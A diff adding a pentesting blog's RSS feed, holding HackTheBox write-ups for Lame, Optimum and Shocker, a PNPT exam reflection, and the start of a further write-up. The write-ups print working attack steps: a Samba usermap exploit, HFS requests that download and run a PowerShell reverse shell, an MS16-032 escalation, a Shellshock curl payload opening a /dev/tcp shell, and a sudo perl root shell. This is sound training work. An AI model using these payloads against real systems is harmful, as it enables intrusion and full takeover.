@@ -1,0 +1,2293 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on Hi, I&#39;m Rob.</title>
+        <link>https://robscharf.github.io/posts/</link>
+        <description>Recent content in Posts on Hi, I&#39;m Rob.</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+        <lastBuildDate>Mon, 23 Jan 2023 10:25:00 +0000</lastBuildDate>
+        <atom:link href="https://robscharf.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB Easy Round-Up (Part 2): Lame, Optimum, Shocker -- Write-Ups</title>
+            <link>https://robscharf.github.io/posts/2023/01/htb-easy-round-up-part-2-lame-optimum-shocker--write-ups/</link>
+            <pubDate>Mon, 23 Jan 2023 10:25:00 +0000</pubDate>
+            
+            <guid>https://robscharf.github.io/posts/2023/01/htb-easy-round-up-part-2-lame-optimum-shocker--write-ups/</guid>
+            <description>About This is the second installment of walkthroughs for three easy rated, retired HackTheBox machines. I am currently making my way through Offensive Security&amp;rsquo;s PEN-200 course, with plans to take the OSCP exam later this year. As part of my preparations, I am working on the infamous TJNull list of OSCP prep-relevant machines across the popular CTF and training platforms. The list can be found here.
+At this moment, I have completed 17 HTB machines from the TJNull list and I am approximately 30% of the way through PEN-200, with all course exercises finished for the first 10 sections of the course.</description>
+            <content type="html"><![CDATA[<h2 id="about">About</h2>
+<p>This is the second installment of walkthroughs for three <em>easy</em> rated, retired HackTheBox machines. I am currently making my way through Offensive Security&rsquo;s PEN-200 course, with plans to take the OSCP exam later this year. As part of my preparations, I am working on the infamous TJNull list of OSCP prep-relevant machines across the popular CTF and training platforms. The list can be found <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit?usp=sharing">here</a>.</p>
+<p>At this moment, I have completed 17 HTB machines from the TJNull list and I am approximately 30% of the way through PEN-200, with all course exercises finished for the first 10 sections of the course.</p>
+<p><br/><br/>
+<strong>Note:</strong> I have replaced all instances of the target virtual machine&rsquo;s ip addresses with <code>&lt;target-ip&gt;</code> (and my own Kali ip address with <code>&lt;kali-ip&gt;</code> ) throughout this write-up.</p>
+<h2 id="lame">Lame</h2>
+<p>Rooting this box involves the discovery and exploitation of an obsolete SMB share via MS-RPC calls containing unfiltered user input via a username mapping script built in to the software.</p>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="nmap">nmap</h4>
+<p>Our nmap host scan returns the following services:</p>
+<pre tabindex="0"><code>21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.3.4
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.4
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+
+22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+
+139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+
+445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+</code></pre><p>Digging deeper into the Samba SMB shares via nmap&rsquo;s scripting engine, we glean the following:</p>
+<pre tabindex="0"><code>| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!
+	opt             Disk
+	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+</code></pre><p>As anonymous logins are permitted, we investigate the shares, especially the <code>tmp/</code> directory, though ultimately nothing of value is located.</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="known-vulnerability---cve-2007-2447">Known vulnerability - CVE-2007-2447</h3>
+<p>While none of the contents of the SMB shares give us a path onto the box, searching ExploitDB for the service version (<code>Samba 3.0.20</code>) returns several results, though none are directly useful. Instead, further research of Samba 3.0.20 yields <a href="https://github.com/amriunix/CVE-2007-2447">CVE-2007-2447</a>. This script <a href="https://amriunix.com/post/cve-2007-2447-samba-usermap-script/">exploits a weakness in Samba 3.0.0 - 3.0.25rc3</a> that allows for unathenticated RCE via the use of usernames that contain shell meta characters.</p>
+<pre tabindex="0"><code>$ python2 usermap_script.py
+[*] CVE-2007-2447 - Samba usermap script
+[-] usage: python usermap_script.py &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;
+</code></pre><p>The script is very easy to use and immediately provides us with <code>root</code> access to the box.</p>
+<pre tabindex="0"><code>$ nc -lvnp 8008
+listening on [any] 8008 ...
+connect to [&lt;kali-ip&gt;] from (UNKNOWN) [&lt;target-ip&gt;] 41884
+whoami
+root
+</code></pre><h2 id="optimum">Optimum</h2>
+<p>Optimum is a Windows box with a Rejetto HFS vulnerability that allows for unauthenticated RCE. From the initial foothold, we are able to use Sherlock to identify the MS16-032 vulnerability, which, in turn, gives us <code>SYSTEM</code> access.</p>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="nmap-1">nmap</h4>
+<p>Our nmap scans reveal the following HTTP server running on the host box:</p>
+<pre tabindex="0"><code>80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
+|_http-title: HFS /
+|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: HFS 2.3
+</code></pre><p>Visiting the web root, we find the following, which we identify as <code>HFS - HTTP File Server</code>, also known as a <code>rejetto</code> project:
+<a href="http://www.rejetto.com/hfs/">http://www.rejetto.com/hfs/</a></p>
+<p><img src="/images/optimum/hfs.png" alt=""></p>
+<h2 id="foothold">Foothold</h2>
+<p>Googling <code>Rejetto HTTP File Server Exploit</code> gives us a <a href="https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/">Rapid7 page</a> explaining the method of exploitation:</p>
+<blockquote>
+<p>Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas.  This module exploits the HFS scripting commands by using &lsquo;%00&rsquo; to bypass the filtering. This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8.</p>
+</blockquote>
+<p>At this point, we could either choose to employ Metasploit, or exploit the service manually. We will do the latter, in the spirit of OSCP preparations.</p>
+<p>We first familiarize ourselves with HFS commands. This can be easily done via the official documentation, located here:  <a href="https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands">https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands</a></p>
+<pre tabindex="0"><code>exec | A
+    ask system to run file A, eventually with parameters. If you need to use the pipe, then use macro quoting.
+    Optional parameter out will let you capture the console output of the program in the variable specified by name.
+    Optional parameter timeout will specify the max number of seconds the app should be left running.
+    Example: {.exec|notepad.}
+</code></pre><p>So with <code>Example: {.exec|notepad.}</code> in hand, we can open Burp and capture a request to begin.</p>
+<h3 id="burp">Burp</h3>
+<p>Here is our request, populated with one null byte in the query:</p>
+<pre tabindex="0"><code>GET /?search=%00 HTTP/1.1
+Host: &lt;target-ip&gt;
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://&lt;target-ip&gt;/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: HFS_SID=0.878811701899394
+Connection: close
+</code></pre><p>Let&rsquo;s try to use the <code>{.exec|notepad.}</code> syntax to try to ping our attacking machine with the <code>ping</code> utility.</p>
+<p>Our request is:</p>
+<pre tabindex="0"><code>GET /?search=%00{.exec|ping+&lt;kali-ip&gt;.} HTTP/1.1
+</code></pre><p><strong>Note:</strong> Remember that these commands <em>must</em> be URL encoded (Burp shortcut: <code>CTRL+U</code>).</p>
+<p>We then fire up <code>tcpdump</code> to monitor incoming traffic and check for the ping.</p>
+<p><code>sudo tcpdump -i tun0</code></p>
+<pre tabindex="0"><code>$ sudo tcpdump -i tun0
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+
+15:53:52.835671 IP kali-bot.57694 &gt; &lt;target-ip&gt;.http: Flags [S], seq 1188628820, win 64240, options [mss 1460,sackOK,TS val 4150609100 ecr 0,nop,wscale 7], length 0
+
+15:53:52.852623 IP &lt;target-ip&gt;.http &gt; kali-bot.57694: Flags [S.], seq 1785899650, ack 1188628821, win 8192, options [mss 1337,nop,wscale 8,sackOK,TS val 5969016 ecr 4150609100], length 0
+
+15:53:52.852642 IP kali-bot.57694 &gt; &lt;target-ip&gt;.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 4150609117 ecr 5969016], length 0
+
+15:53:52.852825 IP kali-bot.57694 &gt; &lt;target-ip&gt;.http: Flags [P.], seq 1:525, ack 1, win 502, options [nop,nop,TS val 4150609117 ecr 5969016], length 524: HTTP: GET /?search=%2500{.exec|ping+&lt;kali-ip&gt;.} HTTP/1.1
+
+15:53:52.889119 IP &lt;target-ip&gt;.http &gt; kali-bot.57694: Flags [P.], seq 1:194, ack 525, win 258, options [nop,nop,TS val 5969020 ecr 4150609117], length 193: HTTP: HTTP/1.1 200 OK
+</code></pre><p>The ping works! Let&rsquo;s see if we can turn this into a reverse shell with Nishang&rsquo;s <code>Invoke PowerShell shell via TCP</code> script.</p>
+<h3 id="nishang-reverse-shell">Nishang Reverse Shell</h3>
+<p><strong>Copy Nishang reverse shell</strong></p>
+<pre tabindex="0"><code>cp /home/virtualtack/tools/shells/reverse-shells/nishang/Invoke-PowerShellTcp.ps1   .
+</code></pre><p>We need to open the script file and add our reverse shell command to be invoked:</p>
+<p><code>Invoke-PowerShellTcp.ps1</code></p>
+<pre tabindex="0"><code>Invoke-PowerShellTcp -Reverse -IPAddress &lt;kali-ip&gt; -Port 8001
+</code></pre><p>Now, back in Burp, we need to instruct the server to download the Nishang script and execute it (once again with a URL-encoded request):</p>
+<pre tabindex="0"><code>GET /?search=%00{.exec|C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString(&#39;http://&lt;kali-ip&gt;:8000/Invoke-PowerShellTcp.ps1&#39;).} HTTP/1.1
+</code></pre><p><strong>Note:</strong> We need to leverage the 64-bit version of PowerShell that resides at <code>C:\Windows\SysNative\PowerShell.exe</code></p>
+<p>After URL encoding, our request looks like:</p>
+<pre tabindex="0"><code>GET /?search=%00{.exec|c%3a\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString(&#39;http%3a//&lt;kali-ip&gt;%3a8000/Invoke-PowerShellTcp.ps1&#39;).} HTTP/1.1
+</code></pre><pre tabindex="0"><code>$ nc -lvnp 8001
+listening on [any] 8001 ...
+connect to [&lt;kali-ip&gt;] from (UNKNOWN) [&lt;target-ip&gt;] 49203
+Windows PowerShell running as user kostas on OPTIMUM
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+ 
+whoami      
+optimum\kostas
+</code></pre><h3 id="privesc">PrivEsc</h3>
+<p>Owing to the age of the machine, we opt to employ a Sherlock scan to help us identify vulnerabilities that will allow us to escalate our privileges to <code>SYSTEM</code>. To make this quicker, we can simply add the relevant <code>Find-AllVulns</code> function call to the end of the <code>Sherlock.ps1</code> script file to allow for immediate execution.</p>
+<p><strong>Search <code>Sherlock.ps1</code> for functions</strong></p>
+<pre tabindex="0"><code>grep -i function Sherlock.ps1
+</code></pre><pre tabindex="0"><code>$ grep -i function Sherlock.ps1
+function Get-FileVersionInfo ($FilePath) {
+function Get-InstalledSoftware($SoftwareName) {
+function Get-Architecture {
+function Get-CPUCoreCount {
+function New-ExploitTable {
+function Set-ExploitTable ($MSBulletin, $VulnStatus) {
+function Get-Results {
+👍function Find-AllVulns 👍{
+function Find-MS10015 {
+function Find-MS10092 {
+function Find-MS13053 {
+function Find-MS13081 {
+function Find-MS14058 {
+function Find-MS15051 {
+function Find-MS15078 {
+function Find-MS16016 {
+function Find-MS16032 {
+function Find-MS16034 {
+function Find-CVE20177199 {
+function Find-MS16135 {
+</code></pre><p><strong>Add <code>Find-AllVulns</code> command to end of script</strong></p>
+<pre tabindex="0"><code>Find-AllVulns
+</code></pre><p>We can then serve the script from our Kali machine and subsequently download it on the remote host.</p>
+<p><strong>Download Sherlock</strong> via PowerShell</p>
+<pre tabindex="0"><code>IEX(New-Object Net.Webclient).downloadString(&#39;http://&lt;kali-ip&gt;:8000/Sherlock.ps1&#39;)
+</code></pre><p><strong>results of <code>Sherlock.ps1</code></strong></p>
+<pre tabindex="0"><code>PS C:\Users\kostas\Desktop&gt; IEX(New-Object Net.Webclient).downloadString(&#39;http://&lt;kali-ip&gt;:8000/Sherlock.ps1&#39;)
+
+
+Title      : User Mode to Ring (KiTrap0D)
+MSBulletin : MS10-015
+CVEID      : 2010-0232
+Link       : https://www.exploit-db.com/exploits/11199/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Task Scheduler .XML
+MSBulletin : MS10-092
+CVEID      : 2010-3338, 2010-3888
+Link       : https://www.exploit-db.com/exploits/19930/
+VulnStatus : Not Vulnerable
+
+✂️ ................................ ✂️
+
+Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+
+✂️ ................................ ✂️
+
+Title      : Nessus Agent 6.6.2 - 6.10.3
+MSBulletin : N/A
+CVEID      : 2017-7199
+Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
+             tml
+VulnStatus : Not Vulnerable
+</code></pre><pre tabindex="0"><code>Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+
+Title      : Windows Kernel-Mode Drivers EoP
+MSBulletin : MS16-034
+CVEID      : 2016-0093/94/95/96
+Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
+             6-034?
+VulnStatus : Appears Vulnerable
+
+Title      : Win32k Elevation of Privilege
+MSBulletin : MS16-135
+CVEID      : 2016-7255
+Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
+             ample-Exploits/MS16-135
+VulnStatus : Appears Vulnerable
+</code></pre><p>Unfortunately, scripts written for <code>MS16-032</code> usually require interactivity and we don&rsquo;t have an interactive terminal. The exploit involves GUI elements. However, Empire has a pre-packed script for just this occasion!</p>
+<p>You can read about <code>Invoke-MS16032.ps1</code> via InfosecMatter <a href="https://www.infosecmatter.com/empire-module-library/?mod=powershell/privesc/ms16-032">here</a>. In short, this is a race-condition vulnerability, which means that a) the remote host must utilize 2+ CPU cores and b) the exploit may occasionally unexpectedly fail. More information on MS16-032 can be found via Google&rsquo;s Project Zero: <a href="https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html">https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html</a></p>
+<p>We copy the exploit to our local directory with:</p>
+<pre tabindex="0"><code>cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1 .
+</code></pre><p>&hellip;and add the function call to the end of the script:</p>
+<pre tabindex="0"><code>Invoke-MS16032 -Command &#34;iex(New-Object Net.WebClient).DownloadString(&#39;http://&lt;kali-ip&gt;:8000/shell.ps1&#39;)&#34;
+</code></pre><p>This calls a copy of our previous <code>Invoke-PowerShellTcp.ps1</code> reverse shell script, which will be executed with privileged permissions due to the MS16-032 vulnerability.</p>
+<p>After setting up a quick python server, we are then ready to download and execute the exploitation script via PowerShell on the remote host:</p>
+<pre tabindex="0"><code>IEX(New-Object Net.WebClient).downloadString(&#39;http://&lt;kali-ip&gt;:8000/Invoke-MS16032.ps1&#39;)
+</code></pre><pre tabindex="0"><code>PS C:\Users\kostas\Desktop&gt; IEX(New-Object Net.WebClient).downloadString(&#39;http://&lt;kali-ip&gt;:8000/Invoke-MS16032.ps1&#39;)
+		__ __ ___ ___   ___     ___ ___ ___ 
+	|  V  |  _|_  | |  _|___|   |_  |_  |
+	|     |_  |_| |_| . |___| | |_  |  _|
+	|_|_|_|___|_____|___|   |___|___|___|
+										
+					[by b33f -&gt; @FuzzySec]
+
+[!] Holy handle leak Batman, we have a SYSTEM shell!!
+</code></pre><pre tabindex="0"><code>$ rlwrap nc -lvnp 8011
+listening on [any] 8011 ...
+connect to [&lt;kali-ip&gt;] from (UNKNOWN) [&lt;target-ip&gt;] 49248
+Windows PowerShell running as user OPTIMUM$ on OPTIMUM
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+whoami
+nt authority\system
+</code></pre><h2 id="shocker">Shocker</h2>
+<p>Shocker, another venerable HTB box, features the Shellshock Bash vulnerability, which is paired with a relatively simple <code>sudo</code>-based prvilege escalation vector.</p>
+<h3 id="enumeration-2">Enumeration</h3>
+<p>As usual, we begin with nmap scans to identify our attack surface.</p>
+<h4 id="nmap-2">nmap</h4>
+<pre tabindex="0"><code>80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+|_http-date: Sat, 10 Dec 2022 01:43:13 GMT; -2s from local time.
+
+2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+</code></pre><p>As the web root did not turn up anything actionable via manual browsing, we turn to Feroxbuster for content discovery.</p>
+<h3 id="feroxbuster">feroxbuster</h3>
+<pre tabindex="0"><code>403      GET       11l       32w      294c http://&lt;target-ip&gt;/cgi-bin/
+403      GET       11l       32w      299c http://&lt;target-ip&gt;/cgi-bin/.html
+</code></pre><p>In consideration of the box&rsquo;s name, I began with the suspicion that we would encounter the famous Shellshock vulnerability. More information on this Bash vulnerability, which affects versions 1.0.3–4.3, can be found here: <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271</a> and here: <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">https://en.wikipedia.org/wiki/Shellshock_(software_bug)</a>.</p>
+<p>Additional content discovery efforts reveal the <code>user.sh</code> script file within the <code>/cgi-bin/</code> directory.</p>
+<pre tabindex="0"><code>feroxbuster -u http://&lt;target-ip&gt;/cgi-bin/ -x htm,html,js,php,txt,json,zip,bak,pdf,docx,conf,py,js,sh,cgi,pl | tee cgi-feroxbuster.txt
+</code></pre><pre tabindex="0"><code>200      GET        7l       18w        0c http://&lt;target-ip&gt;/cgi-bin/user.sh
+</code></pre><p>From here, we can use a curl request to confirm that the server is vulnerable:</p>
+<pre tabindex="0"><code>virtualtack@virtualshack ~/htb/shocker [±main U:2 ?:56 ✗] curl -A &#34;() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;&#34; http://&lt;target-ip&gt;/cgi-bin/user.sh
+shelly
+</code></pre><p>Excellent! Now we can modify our request payload to contain shellcode, giving us a reverse shell.</p>
+<h2 id="foothold-1">Foothold</h2>
+<p><code>curl -A &quot;() { :;}; echo Content-Type: text/html; echo; /bin/sh -i &gt;&amp; /dev/tcp/&lt;kali-ip&gt;/9999 0&gt;&amp;1;&quot; http://&lt;target-ip&gt;/cgi-bin/user.sh</code></p>
+<pre tabindex="0"><code>virtualtack@virtualshack ~/htb/shocker [±main U:2 ?:56 ✗] nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [&lt;kali-ip&gt;] from (UNKNOWN) [&lt;target-ip&gt;] 49184
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ whoami
+shelly
+</code></pre><h2 id="privesc-1">PrivEsc</h2>
+<p>Luckily, the privilege escalation vector is simple. As one of our standard, initial checks after obtaining user access, we check to see which commands and/or binaries can be run by our user with <code>root</code> permissions.</p>
+<pre tabindex="0"><code>$ sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+</code></pre><p>Thus, the <code>shelly</code> user account has been configured to run the <code>perl</code> binary locate din <code>/usr/bin/</code> with <code>root</code> privileges, all without needing the account password. From here, a <a href="https://gtfobins.github.io/gtfobins/perl/">quick GTFOBins check</a> reveals that we simply need to run <code>sudo perl -e 'exec &quot;/bin/sh&quot;;'</code> to spawn a shell session with full access.</p>
+<pre tabindex="0"><code>$ sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+$ sudo perl -e &#39;exec &#34;/bin/sh&#34;;&#39;
+whoami
+root
+</code></pre><h2 id="lessons-learned">Lessons Learned</h2>
+<p>This round of TJNull boxes provided excellent opportunities for review</p>
+<ul>
+<li>Lame
+<ul>
+<li>This was my first exposure to CVE-2007-2447.</li>
+<li>It was also a nice reminder that SMB shares that allow <code>anonymous</code> access do not always contain files that will lead to a foothold. Instead, the service itself can be vulnerable!</li>
+</ul>
+</li>
+<li>Optimum
+<ul>
+<li>This was the first time that I needed to use HFS scripting, and the syntax was not immediately intuitive to me.</li>
+</ul>
+</li>
+<li>Shocker
+<ul>
+<li>While I have encountered the Shellshock vulnerability previously, the name of the script file(s) in <code>/cgi-bin/</code> differed. This reinforced the importance of thorough content discovery/directory busting.</li>
+</ul>
+</li>
+</ul>
+]]></content>
+        </item>
+        
+        <item>
+            <title>I passed the PNPT!</title>
+            <link>https://robscharf.github.io/posts/2022/11/i-passed-the-pnpt/</link>
+            <pubDate>Mon, 28 Nov 2022 11:35:00 +0000</pubDate>
+            
+            <guid>https://robscharf.github.io/posts/2022/11/i-passed-the-pnpt/</guid>
+            <description>I am happy to share that I recently passed the Practical Network Penetration Tester certification exam on November 6!
+The Exam According to TCM&amp;rsquo;s website:
+The PNPT certification exam is a one-of-a-kind ethical hacking certification exam that assesses a student’s ability to perform an external and internal network penetration test at a professional level. Students will have five (5) full days to complete the assessment and an additional two (2) days to write a professional report.</description>
+            <content type="html"><![CDATA[<p>I am happy to share that I recently passed the Practical Network Penetration Tester certification exam on November 6!</p>
+<br/>
+<center>
+<img src="/images/pnpt-cert.png" style="height:420px"> 
+</center>
+<h2 id="the-exam">The Exam</h2>
+<p>According to <a href="https://certifications.tcm-sec.com/pnpt/">TCM&rsquo;s website</a>:</p>
+<blockquote>
+<p>The PNPT certification exam is a one-of-a-kind ethical hacking certification exam that assesses a student’s ability to perform an external and internal network penetration test at a professional level.  Students will have five (5) full days to complete the assessment and an additional two (2) days to write a professional report.</p>
+</blockquote>
+<h2 id="my-experience">My Experience</h2>
+<h3 id="preparation">Preparation</h3>
+<p>In the run-up to my more intensive and direct exam preparation, I largely continued along my learning trajectory on TryHackMe (with a bit of HacktheBox sprinkled in, for good measure). As of the time of writing, I am ranked 3612 on THM, with 204 rooms complete, including the Wreath network and the &ldquo;Compromising Active Directory&rdquo; series.</p>
+<p>In terms of preparations for the PNPT itself, I completed the vast majority of the 5 provided/recommended training modules, as well as <em>Movement, Pivoting and Persistence</em> by <a href="https://medium.themayor.tech/">Joe Helle</a>. Taking my previous experience with CTFs (and preparation fatigue!) into consideration, I made the decision to complete only the sections of the Windows and Linux Privilege Escalation courses that contained unfamiliar vectors, leaving the remainder for after the exam (or, had I failed, my second attempt).</p>
+<p>A quick <strong>note</strong>: I completed all of my course preparations in such a way that I would not need to use Metasploit in applying the concepts/techniques that I learned. For metasploit-specific modules, I spent time ensuring that I could perform the same enumeration/exploitation with other tools.</p>
+<h4 id="practical-ethical-hacking---the-complete-course">Practical Ethical Hacking - The Complete Course</h4>
+<p>TCM&rsquo;s PEH course, its most popular offering, covers a huge range of topics for the beginning penetration tester. From networking to python scripting, to OSINT approaches, buffer overflow exploitation, as well as Windows Active Directory and web application pentesting, this course contains a wealth of useful training for beginners in offensive security. Personally, I found the introduction to buffer overflows and Active Directory portions of the course the most helpful.</p>
+<p>More specifically, the PEH course&rsquo;s AD section facilitates students standing up and configuring their own local Active Directory network environment. Coming into the course, my homelab ambitions remained solidly below the top priorities in my to-do list (much to my own detriment!). Paired with the MPP course (more below), I came out of my PNPT prep with a fully functioning homelab, complete with multiple nested virtual networks. I also gained proficiency with the creation and configuration of PfSense routers, which has allowed me to keep my network flexible and neatly segmented.</p>
+<h4 id="open-source-intelligence-osint-fundamentals">Open-Source Intelligence (OSINT) Fundamentals</h4>
+<p>While OSINT represents the segement of the training that I am the least organically interested in, I found several valuable tools and methodologies in this course that I will be carrying forward with me. While relatively simple, I found the challenges entertaining.</p>
+<h4 id="external-pentest-playbook-epp">External Pentest Playbook (EPP)</h4>
+<p>I found this course a bit more directly relevant to my development, as it introduced me to popular/common external attack vectors, as well as methods for compiling findings into a professional-grade report - the latter of which I had not yet had an opportunity to do with any real seriousness in my studies to this point. While short, I found this course to be very worthwhile.</p>
+<h4 id="windows-privilege-escalation-for-beginners">Windows Privilege Escalation for Beginners</h4>
+<p>As mentioned earlier, I did not finish 100% of this course before taking my exam. Instead, I focused on the topics that were unfamiliar to me (and/or for which I had gaps in my notes). In particular, I found the modules on Windows System for Linux, Token Impersonation, Alternate Data Streams, and the Windows Registry to be most helpful.</p>
+<h4 id="linux-privilege-escalation-for-beginners">Linux Privilege Escalation for Beginners</h4>
+<p>Similar to the Windows PrivEsc course, I did not complete this in full before my exam date. I believe that my CTF experience gave me a larger advatage in Linux PrivEsc than with regard to Windows systems, simply due to the relative popularity of each. That said, I found the section on Docker container exploitation to be the most valuable going forward.</p>
+<h4 id="movement-pivoting-and-persistence-mpp">Movement, Pivoting and Persistence (MPP)</h4>
+<p>Behind the PEH flagship course and EPP, I found the MPP course the most useful of the recommended TCM offerings. Not only did the course provide a solid refresher on AD network enumeration, it facilitated the expansion of my homelab. I found the sections that directly or indirectly dealt with AV/AM evasion to be especially helpful, as well. While I found the Covenant C2 framework frustrating to use, I appreciate the introduction to it nonetheless.</p>
+<h3 id="exam-impressions">Exam Impressions</h3>
+<p>On the whole, I really enjoyed the PNPT exam experience. As someone who has only been pursuing penetration testing/offensive security for approximately 8 months, I found the difficulty level to be excellent, relative to my skills. While I got stuck on one section of the exam for an extended period of time (and grappled with the ensuing emotional challneges), I finished with time to spare. I enjoyed the diversity of challenges presented by the exam and feel like I was able to use skills developed both before and during my immediate preparation, and I found myself thinking of additional possible network attack vectors for days after my exam ended!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HTB Easy Round-Up (Part 1): Blue, Devel, Jerry -- Write-Ups</title>
+            <link>https://robscharf.github.io/posts/2022/10/htb-easy-round-up-part-1-blue-devel-jerry--write-ups/</link>
+            <pubDate>Tue, 25 Oct 2022 13:15:00 +0000</pubDate>
+            
+            <guid>https://robscharf.github.io/posts/2022/10/htb-easy-round-up-part-1-blue-devel-jerry--write-ups/</guid>
+            <description>About Instead of a single box write-up, I am including walkthroughs for three easy rated, retired Windows HackTheBox machines here to kick off my pursuit of completing the infamous TJNull list of OSCP prep-relevant machines across the popular CTF and training platforms. The recently updated list can be found here. Due to the simplicity of the machines, these writeups are presented with concision in mind, unlike the majority of my other walkthroughs.</description>
+            <content type="html"><![CDATA[<h2 id="about">About</h2>
+<p>Instead of a single box write-up, I am including walkthroughs for three <em>easy</em> rated, retired Windows HackTheBox machines here to kick off my pursuit of completing the infamous TJNull list of OSCP prep-relevant machines across the popular CTF and training platforms. The <a href="https://twitter.com/TJ_Null/status/1580174678555230209">recently updated</a> list can be found <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit?usp=sharing">here</a>. Due to the simplicity of the machines, these writeups are presented with concision in mind, unlike the majority of my other walkthroughs.
+<br/><br/>
+<strong>Note:</strong> I have replaced all instances of the virtual machines&rsquo; ip addresses with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
+<h2 id="blue">Blue</h2>
+<p>Rooting this box involves the discovery and exploitation of the EternalBlue SMBv1 vulnerability. For more information on EternalBlue, see <a href="https://www.avast.com/c-eternalblue">this explanation on Avast.com</a>. In this write-up, I present methods for exploitation using, and not using, Metasploit.</p>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="nmap">nmap</h4>
+<p>Enumeration is accomplished quickly and easily with nmap. After finding the machine&rsquo;s SMB service active and listening on ports 135/445, we can use nmap&rsquo;s <code>smb-vuln-ms17-010</code> script to identify the vulnerability. For more information on the script, <a href="https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html">click here</a>.</p>
+<pre tabindex="0"><code>| smb-vuln-ms17-010: 
+|   VULNERABLE:
